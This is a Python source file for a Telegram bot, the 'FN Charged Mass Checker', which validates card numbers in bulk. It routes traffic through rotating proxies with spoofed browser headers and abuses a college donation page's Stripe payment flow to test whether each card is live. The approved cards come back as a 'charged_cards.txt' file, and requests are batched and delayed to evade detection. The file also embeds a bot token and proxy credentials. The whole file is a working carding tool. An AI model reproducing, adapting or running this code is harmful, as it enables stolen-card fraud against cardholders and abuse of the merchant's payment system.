import requests
import json
import time
import random
from colorama import Fore, init
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import asyncio
import io
import logging

# Initialize colorama for colored terminal output
init(autoreset=True)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global variables
user_progress = {}
active_users = set()
TOKEN = "7748515975:AAHyGpFl4HXLLud45VS4v4vMkLfOiA6YNSs"  # Replace with your bot token
PROXY_LIST = [
    "http://user-PP_8TM74LBMHH-country-US-city-new_york:81c9mj0z@sp-pro.porterproxies.com:7000",
]

def get_random_proxy():
    """Select a random proxy from the list"""
    return random.choice(PROXY_LIST)

def create_session():
    """Create a new session with headers and a random proxy"""
    proxy = get_random_proxy()
    session = requests.Session()
    session.proxies = {"http": proxy, "https": proxy}
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.121 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
        "sec-ch-ua": '"Not(A:Brand";v="99", "Android WebView";v="133", "Chromium";v="133"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    })
    logger.debug(f"Using proxy: {proxy}")
    return session

def get_payment_intent(session, amount="5"):
    """Get a payment intent ID and client secret with retry logic for initial GET"""
    donation_url = "https://www.mc.edu/give"
    payment_url = "https://go.mc.edu/register/form?cmd=payment"
    
    # Retry logic for initial GET request
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = session.get(donation_url, timeout=15)
            logger.debug(f"Initial GET to {donation_url} - Status: {response.status_code}")
            break
        except requests.exceptions.RequestException as e:
            if attempt < max_retries - 1:
                time.sleep(5 * (2 ** attempt))  # Exponential backoff
            else:
                logger.error(f"Failed to initialize cookies after {max_retries} attempts: {str(e)}")
                return None, None
    
    headers = {
        "Host": "go.mc.edu",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://go.mc.edu",
        "Referer": "https://go.mc.edu/register/?id=789d4530-51d3-d805-2676-2ca00dbbc45c&%3Bamp=&%3Bsys%3Afield%3Aonline_giving_department=3cef5b4a-e694-4df1-8ec4-1c94954a5131",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }
    
    data = {
        "cmd": "getIntent",
        "amount": amount,
        "payment_type": "card",
        "summary": "Donations",
        "currency": "usd",
        "account": "acct_1KQdE6PmVGzx57IR",
        "setupFutureUsage": "",
        "test": "0",
        "add_fee": "0"
    }
    
    try:
        response = session.post(payment_url, headers=headers, data=data, timeout=15)
        response.raise_for_status()
        response_data = json.loads(response.text)
        payment_intent_id = response_data.get('id')
        client_secret = response_data.get('clientSecret')
        
        if payment_intent_id and client_secret:
            logger.debug(f"Payment Intent ID: {payment_intent_id}, Client Secret: {client_secret}")
            return payment_intent_id, client_secret
        else:
            logger.error(f"Invalid response: {response.text}")
            return None, None
    except requests.exceptions.RequestException as e:
        status_code = e.response.status_code if e.response is not None else "N/A"
        response_text = e.response.text if e.response is not None else "No response body"
        logger.error(f"Network error: {str(e)} - Status: {status_code} - Response: {response_text}")
        return None, None

def process_card(session, payment_intent_id, client_secret, card_info):
    """Process a card with the given payment intent and client secret"""
    try:
        card_number, exp_month, exp_year, cvc = card_info
        card_number = card_number.replace(" ", "")
        
        url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
        
        headers = {
            "Host": "api.stripe.com",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        }
        
        data = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_number,
            "payment_method_data[card][cvc]": cvc,
            "payment_method_data[card][exp_year]": exp_year,
            "payment_method_data[card][exp_month]": exp_month,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][postal_code]": "10006",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[payment_user_agent]": "stripe.js/a8247d96cc; stripe-js-v3/a8247d96cc; payment-element; deferred-intent",
            "payment_method_data[referrer]": "https://go.mc.edu",
            "payment_method_data[time_on_page]": str(int(time.time() * 1000)),
            "payment_method_data[client_attribution_metadata][client_session_id]": "d67fc2ce-78dc-4f28-8ce1-2a546a6606dd",
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
            "payment_method_data[guid]": "NA",
            "payment_method_data[muid]": "NA",
            "payment_method_data[sid]": "NA",
            "expected_payment_method_type": "card",
            "client_context[currency]": "usd",
            "client_context[mode]": "payment",
            "client_context[capture_method]": "manual",
            "client_context[payment_method_types][0]": "card",
            "client_context[payment_method_options][us_bank_account][verification_method]": "instant",
            "use_stripe_sdk": "true",
            "key": "pk_live_f1etgxOxEyOS3K9myaBrBqrA",
            "_stripe_account": "acct_1KQdE6PmVGzx57IR",
            "client_secret": client_secret,
        }
        
        response = session.post(url, headers=headers, data=data, timeout=20)
        response_json = json.loads(response.text)
        
        if response.status_code == 200 and response_json.get('status') == 'requires_capture':
            return True, "Card approved ✅"
        else:
            error = response_json.get('error', {})
            decline_code = error.get('decline_code', 'unknown')
            message = error.get('message', 'Unknown error')
            return False, f"Declined ({decline_code}): {message}"
    except Exception as e:
        return False, f"Error processing card: {str(e)}"

def parse_card_line(line):
    """Parse a line from a text file containing card information"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    try:
        parts = line.split('|')
        if len(parts) == 4:
            card_number, exp_month, exp_year, cvc = parts
            if "20" in exp_year:
                exp_year = exp_year.split("20")[1]
            return card_number.strip(), exp_month.strip(), exp_year.strip(), cvc.strip()
        return None
    except Exception:
        return None

def check_single_card_sync(card_line):
    """Synchronous function to check a single card"""
    try:
        card_info = parse_card_line(card_line)
        if not card_info:
            return False, "Invalid card format", card_line

        session = create_session()
        payment_intent_id, client_secret = get_payment_intent(session)
        if not all([payment_intent_id, client_secret]):
            return False, "Failed to get payment intent", card_line

        success, msg = process_card(session, payment_intent_id, client_secret, card_info)
        return success, msg, card_line
    except Exception as e:
        logger.error(f"Error checking card {card_line}: {str(e)}")
        return False, f"Error: {str(e)}", card_line

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    await update.message.reply_text("Hello! Welcome to FN Charged Mass Checker 👋\nSend your TXT file to check, or use /chk to test a single CC.")

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command for single CC checking"""
    user_id = update.effective_user.id
    if user_id in active_users:
        await update.message.reply_text("Please wait until your current check completes.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /chk 4222222222222|05|25|372")
        return

    card_info = ' '.join(context.args)
    card_data = parse_card_line(card_info)
    if not card_data:
        await update.message.reply_text("Invalid CC format. Use: /chk 4222222222222|05|25|372")
        return

    active_users.add(user_id)
    checking_msg = await update.message.reply_text("🔍 Checking card...")
    
    try:
        session = create_session()
        payment_intent_id, client_secret = get_payment_intent(session)
        if not all([payment_intent_id, client_secret]):
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
            await update.message.reply_text("Failed to initialize payment gateway. Check logs for details.")
            return

        success, msg = process_card(session, payment_intent_id, client_secret, card_data)
        card_number = card_data[0]
        
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
        if success:
            await update.message.reply_text(f"✅ Approved: {card_number}")
        else:
            await update.message.reply_text(f"❌ Declined: {card_number}\nReason: {msg}")
    except Exception as e:
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
        await update.message.reply_text(f"Error: {str(e)}")
    finally:
        active_users.remove(user_id)

async def check_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_content: bytes):
    """Process file with progress tracking, checking 2 CCs at a time with 30s sleep between batches"""
    user_id = update.effective_user.id
    if user_id in active_users:
        await update.message.reply_text("Please wait until your current check completes.")
        return

    active_users.add(user_id)
    user_progress[user_id] = {"current": 0, "total": 0, "approved": 0, "declined": 0}
    
    try:
        file_text = file_content.decode()
        cards = [line.strip() for line in file_text.split('\n') if line.strip() and not line.startswith('#')]
        user_progress[user_id]["total"] = len(cards)
        
        charged_cards = []
        await update.message.reply_text(f"Starting check for {len(cards)} cards...")

        # Process cards in batches of 2
        for i in range(0, len(cards), 2):
            batch = cards[i:i+2]  # Get up to 2 cards (handles odd number of cards)
            # Create tasks to check cards concurrently in separate threads
            tasks = [asyncio.to_thread(check_single_card_sync, card) for card in batch]
            results = await asyncio.gather(*tasks)
            # Process results
            for success, msg, card in results:
                if success:
                    charged_cards.append(card)
                    user_progress[user_id]["approved"] += 1
                else:
                    user_progress[user_id]["declined"] += 1
            user_progress[user_id]["current"] += len(batch)
            # Update progress every 5 cards or at the end
            if user_progress[user_id]["current"] % 5 == 0 or user_progress[user_id]["current"] == len(cards):
                await update.message.reply_text(
                    f"Progress: {user_progress[user_id]['current']}/{len(cards)} "
                    f"({user_progress[user_id]['current']/len(cards)*100:.1f}%)"
                )
            # Sleep for 30 seconds before the next batch, unless it's the last batch
            if i + 2 < len(cards):
                await asyncio.sleep(30)

        # Send results
        if charged_cards:
            result = "Charged cards:\n" + "\n".join(charged_cards)
            await update.message.reply_document(
                document=InputFile(io.BytesIO(result.encode()), filename="charged_cards.txt"),
                caption=f"Found {len(charged_cards)} charged cards!"
            )
        else:
            await update.message.reply_text("No charged cards found.")
            
    except Exception as e:
        await update.message.reply_text(f"Error processing file: {str(e)}")
    finally:
        active_users.remove(user_id)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command to show checking progress"""
    user_id = update.effective_user.id
    if user_id not in user_progress:
        await update.message.reply_text("No active checks running.")
        return
    
    stats = user_progress[user_id]
    total = stats["total"]
    current = stats["current"]
    approved = stats["approved"]
    declined = stats["declined"]
    left = total - current
    
    await update.message.reply_text(
        f"📊 Stats:\n"
        f"Total: {total}\n"
        f"Checked: {current}\n"
        f"Approved: {approved}\n"
        f"Declined: {declined}\n"
        f"Left: {left}\n"
        f"Progress: {current/total*100:.1f}%"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming messages"""
    if update.message.document and update.message.document.mime_type == "text/plain":
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        await check_file(update, context, file_content)
    else:
        await update.message.reply_text("Please send a TXT file or use /chk command.")

def main():
    """Main application setup"""
    if not PROXY_LIST:
        print(Fore.RED + "Error: No proxies configured. This will fail on data center IPs like DigitalOcean.")
        return
    print(Fore.CYAN + f"Bot is running with {len(PROXY_LIST)} rotating proxies...")
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(MessageHandler(filters.Document.TXT | filters.TEXT & ~filters.COMMAND, handle_message))
    print(Fore.CYAN + "Bot is running with updated configuration...")
    application.run_polling()

if __name__ == "__main__":
    main()
